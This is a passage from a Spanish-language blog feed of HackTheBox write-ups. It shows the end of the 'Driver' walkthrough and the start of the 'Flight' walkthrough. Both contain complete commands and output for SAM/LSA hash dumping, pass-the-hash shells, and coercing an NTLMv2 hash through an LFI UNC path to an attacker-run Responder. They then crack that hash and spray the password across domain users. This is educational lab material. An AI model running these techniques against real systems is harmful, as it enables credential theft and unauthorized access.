+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.250.229 <span class="nt">-u</span> miguelito <span class="nt">-p</span> miguel123 <span class="nt">--sam</span>
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 10240 x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\m</span>iguelito:miguel123 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] Dumping SAM hashes
+SMB         10.129.250.229  445    DRIVER           Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
+SMB         10.129.250.229  445    DRIVER           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.250.229  445    DRIVER           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.250.229  445    DRIVER           tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::
+SMB         10.129.250.229  445    DRIVER           miguelito:1004:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
+SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] Added 5 SAM hashes to the database
+</code></pre></div></div>
+
+<ul>
+  <li>También lo podemos hacer con <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="s1">'driver.htb/miguelito:miguel123@10.129.250.229'</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Service RemoteRegistry is <span class="k">in </span>stopped state
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Service RemoteRegistry is disabled, enabling it
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service RemoteRegistry
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0xe5b3cda034afd685bc69ccd3c4e9387c
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping <span class="nb">local </span>SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::
+miguelito:1004:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping cached domain logon information <span class="o">(</span>domain/username:hash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping LSA Secrets
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DefaultPassword
+DRIVER<span class="se">\t</span>ony:liltony
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> DPAPI_SYSTEM
+dpapi_machinekey:0x68d8efd1bd3fa3ab206268f0bbc6e2a4a5e4b43e
+dpapi_userkey:0x68060403e8f0276a683ad704b45dc7b850d9722f
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stopping service RemoteRegistry
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the disabled state <span class="k">for </span>service RemoteRegistry
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora aplicamos <code class="language-plaintext highlighter-rouge">passathehash</code> y nos conectamos como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.250.229 <span class="nt">-u</span> Administrator <span class="nt">-H</span> d1256cff8b5b5fdb8c327d3b6c3f5017
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>driver<span class="se">\a</span>dministrator
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Flight (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/04/06/flight.html" rel="alternate" type="text/html" title="HackTheBox - Flight (hard)" /><published>2024-04-06T00:00:00-06:00</published><updated>2024-04-06T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/04/06/flight</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/04/06/flight.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/a7af9035e5089332dfbfeb328d663f3e.png" />
+</p>
+
+<p>En este post vamos a estar haciendo la máquina Flight de Hackthebox de dificultad difícil vamos a estar consiguiendo hashes ntlmv2 de varios usuarios para ganar acceso ala máquina víctima además vamos a estar subiendo archivos para también ganar acceso, ya que tenemos privilegios de escritura en algunos archivos de la máquina por smb para la escalada de privilegios abusaremos de un permiso que tenemos enable y más.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.11.187
+PING 10.10.11.187 <span class="o">(</span>10.10.11.187<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.11.187: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>103 ms
+
+<span class="nt">---</span> 10.10.11.187 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 103.446/103.446/103.446/0.000 ms
+❯ whichSystem.py 10.10.11.187
+
+10.10.11.187 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
+</code></pre></div></div>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,80,135,139,389,445,636,3268,49667,49673,49724 10.10.11.187 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-05-06 11:09 CST
+Nmap scan report <span class="k">for </span>10.10.11.187
+Host is up <span class="o">(</span>0.12s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.52 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1m PHP/8.1.1<span class="o">)</span>
+|_http-server-header: Apache/2.4.52 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1m PHP/8.1.1
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: g0 Aviation
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-05-07 00:09:27Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: flight.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: flight.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49724/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: G0<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m54s
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-05-07T00:10:24
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+</code></pre></div></div>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<ul>
+  <li>Vamos a usar la herramienta <code class="language-plaintext highlighter-rouge">crackmapexec</code> para ver ante que estamos y vemos el nombre del dominio que es <strong>flight.htb</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187
+SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.187 flight.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.10.11.187 flight.htb
+❯ ping <span class="nt">-c</span> 1 flight.htb
+PING flight.htb <span class="o">(</span>10.10.11.187<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from flight.htb <span class="o">(</span>10.10.11.187<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>143 ms
+
+<span class="nt">---</span> flight.htb ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 143.199/143.199/143.199/0.000 ms
+</code></pre></div></div>
+
+<p>Si listamos los recursos compartidos por <strong>smb</strong> y empleamos un <strong>Null session</strong> de momento no podemos ver nada asi que vamos a seguir enumerando la maquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.11.187 <span class="nt">-N</span>
+Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">OpenSSL</span><span class="p">[</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="n">g0</span> <span class="no">Aviation</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>Esta es la pagina web que corre en el puerto <strong>80</strong></p>
+
+<p><img src="/assets/images/htb-writeup-flight/web1.png" alt="" /></p>
+
+<p>Si buscamos por mas subdominios en la maquina encontramos uno nuevo <strong>school.flight.htb</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-u</span> <span class="s2">"http://flight.htb/"</span> <span class="nt">-H</span> <span class="s2">"Host: FUZZ.flight.htb"</span> <span class="nt">--hl</span> 154
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://flight.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                        
+=====================================================================
+
+000000624:   200        90 L     412 W      3996 Ch     "school"
+</span></code></pre></div></div>
+
+<p>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 school.flight.htb
+PING flight.htb <span class="o">(</span>10.10.11.187<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from flight.htb <span class="o">(</span>10.10.11.187<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>105 ms
+
+<span class="nt">---</span> flight.htb ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 104.703/104.703/104.703/0.000 ms
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">school</span><span class="p">.</span><span class="nf">flight</span><span class="p">.</span><span class="nf">htb</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">school</span><span class="p">.</span><span class="nf">flight</span><span class="p">.</span><span class="nf">htb</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">52</span> <span class="p">(</span><span class="no">Win64</span><span class="p">)</span> <span class="no">OpenSSL</span><span class="o">/</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.187</span><span class="p">],</span> <span class="no">OpenSSL</span><span class="p">[</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">1</span><span class="n">m</span><span class="p">],</span> <span class="no">PHP</span><span class="p">[</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Aviation</span> <span class="no">School</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">PHP</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la pagina web y bueno en la <code class="language-plaintext highlighter-rouge">url</code> ya podemos darnos una idea de que tal vez sea vulnerable a <code class="language-plaintext highlighter-rouge">LFI</code> vamos  a probar.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/flight/web2.png" />
+</p>
+
+<ul>
+  <li>Pero nos detecta.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/flight/web3.png" />
+</p>
+
+<ul>
+  <li>Si apuntamos a la pagina web con <code class="language-plaintext highlighter-rouge">view=index.php</code> vemos que nos da una respuesta algo rara.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/flight/web4.png" />
+</p>
+
+<ul>
+  <li>Se esta haciendo una peticion por <code class="language-plaintext highlighter-rouge">GET</code> asi que vamos a hacer una peticion con <code class="language-plaintext highlighter-rouge">curl</code> a un recurso para ver si nos llega el <strong>hash ntlmv2</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s2">"http://school.flight.htb/index.php?view=//10.10.14.86/test"</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">responder</code> nos vamos a poner en la interfaz <code class="language-plaintext highlighter-rouge">tun0</code> y nos llega el  <code class="language-plaintext highlighter-rouge">hash</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ responder <span class="nt">-I</span> tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+  To <span class="nb">kill </span>this script hit CTRL-C
+
+
+<span class="o">[</span>+] Poisoners:
+    LLMNR                      <span class="o">[</span>ON]
+    NBT-NS                     <span class="o">[</span>ON]
+    DNS/MDNS                   <span class="o">[</span>ON]
+
+<span class="o">[</span>+] Servers:
+    HTTP server                <span class="o">[</span>ON]
+    HTTPS server               <span class="o">[</span>ON]
+    WPAD proxy                 <span class="o">[</span>OFF]
+    Auth proxy                 <span class="o">[</span>OFF]
+    SMB server                 <span class="o">[</span>ON]
+    Kerberos server            <span class="o">[</span>ON]
+    SQL server                 <span class="o">[</span>ON]
+    FTP server                 <span class="o">[</span>ON]
+    IMAP server                <span class="o">[</span>ON]
+    POP3 server                <span class="o">[</span>ON]
+    SMTP server                <span class="o">[</span>ON]
+    DNS server                 <span class="o">[</span>ON]
+    LDAP server                <span class="o">[</span>ON]
+    RDP server                 <span class="o">[</span>ON]
+    DCE-RPC server             <span class="o">[</span>ON]
+    WinRM server               <span class="o">[</span>ON]
+
+<span class="o">[</span>+] HTTP Options:
+    Always serving EXE         <span class="o">[</span>OFF]
+    Serving EXE                <span class="o">[</span>OFF]
+    Serving HTML               <span class="o">[</span>OFF]
+    Upstream Proxy             <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Poisoning Options:
+    Analyze Mode               <span class="o">[</span>OFF]
+    Force WPAD auth            <span class="o">[</span>OFF]
+    Force Basic Auth           <span class="o">[</span>OFF]
+    Force LM downgrade         <span class="o">[</span>OFF]
+    Fingerprint hosts          <span class="o">[</span>OFF]
+
+<span class="o">[</span>+] Generic Options:
+    Responder NIC              <span class="o">[</span>tun0]
+    Responder IP               <span class="o">[</span>10.10.14.86]
+    Challenge <span class="nb">set</span>              <span class="o">[</span>random]
+    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-UXGLJ5F51VJ]
+    Responder Domain Name      [SIB7.LOCAL]
+    Responder DCE-RPC Port     [45975]
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:e67211d7f7146072:C651456AAA11235832A5DBB10696A02E:01010000000000008013613C0F80D90142626E9A48FEF4A30000000002000800530049004200370001001E00570049004E002D005500580047004C004A00350046003500310056004A0004003400570049004E002D005500580047004C004A00350046003500310056004A002E0053004900420037002E004C004F00430041004C000300140053004900420037002E004C004F00430041004C000500140053004900420037002E004C004F00430041004C00070008008013613C0F80D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a crackearlo y tenemos la contraseña de <code class="language-plaintext highlighter-rouge">svc_apache:S@Ss!K@*t13</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn <span class="nb">hash
+</span>svc_apache::flight:e67211d7f7146072:C651456AAA11235832A5DBB10696A02E:01010000000000008013613C0F80D90142626E9A48FEF4A30000000002000800530049004200370001001E00570049004E002D005500580047004C004A00350046003500310056004A0004003400570049004E002D005500580047004C004A00350046003500310056004A002E0053004900420037002E004C004F00430041004C000300140053004900420037002E004C004F00430041004C000500140053004900420037002E004C004F00430041004C00070008008013613C0F80D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
+❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+S@Ss!K@<span class="k">*</span>t13      <span class="o">(</span>svc_apache<span class="o">)</span>
+1g 0:00:00:11 DONE <span class="o">(</span>2023-05-06 11:40<span class="o">)</span> 0.08361g/s 891547p/s 891547c/s 891547C/s SADSAM..S@29<span class="nv">$JL</span>
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<ul>
+  <li>Comprobamos que son correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> <span class="s1">'svc_apache'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\s</span>vc_apache:S@Ss!K@<span class="k">*</span>t13 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora sabiendo esto ponemos usar <code class="language-plaintext highlighter-rouge">smbclient</code> o <code class="language-plaintext highlighter-rouge">smbmap</code> para ver los recursos compartidos a nivel de red.</li>
+</ul>
+
+<h2 id="smb-svc_apache">SMB svc_apache</h2>
+
+<ul>
+  <li>Nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> //10.10.11.187/ <span class="nt">-U</span> svc_apache
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>vc_apache]:
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Shared          Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+	Web             Disk      
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-u</span> <span class="s1">'svc_apache'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">-H</span> 10.10.11.187
+<span class="o">[</span>+] IP: 10.10.11.187:445	Name: flight.htb                                        
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Shared                                            	READ ONLY	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+	Web                                               	READ ONLY	
+</code></pre></div></div>
+
+<h2 id="domain-users">Domain Users</h2>
+
+<ul>
+  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> para obtener los usuarios del dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> <span class="s1">'svc_apache'</span> <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">--users</span> | <span class="nb">awk</span> <span class="s1">'{print $5}'</span> | <span class="nb">grep </span>flight
+flight.htb<span class="se">\O</span>.Possum
+flight.htb<span class="se">\s</span>vc_apache
+flight.htb<span class="se">\V</span>.Stevens
+flight.htb<span class="se">\D</span>.Truff
+flight.htb<span class="se">\I</span>.Francis
+flight.htb<span class="se">\W</span>.Walker
+flight.htb<span class="se">\C</span>.Bum
+flight.htb<span class="se">\M</span>.Gold
+flight.htb<span class="se">\L</span>.Kein
+flight.htb<span class="se">\G</span>.Lors
+flight.htb<span class="se">\R</span>.Cold
+flight.htb<span class="se">\S</span>.Moon
+flight.htb<span class="se">\k</span>rbtgt
+flight.htb<span class="se">\G</span>uest
+flight.htb<span class="se">\A</span>dministrator
+</code></pre></div></div>
+
+<ul>
+  <li>Tambien podemos usar <code class="language-plaintext highlighter-rouge">rpcclient</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.187 <span class="nt">-U</span> <span class="s1">'svc_apache%S@Ss!K@*t13'</span> <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\[</span><span class="s2">.*?</span><span class="se">\]</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"0x"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span>
+Administrator
+Guest
+krbtgt
+S.Moon
+R.Cold
+G.Lors
+L.Kein
+M.Gold
+C.Bum
+W.Walker
+I.Francis
+D.Truff
+V.Stevens
+svc_apache
+O.Possum
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> para ver si alguno de estos usuarios reutiliza la contraseña que ya tenemos agrega los usuarios a una lista.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'S@Ss!K@*t13'</span> <span class="nt">--continue-on-success</span>
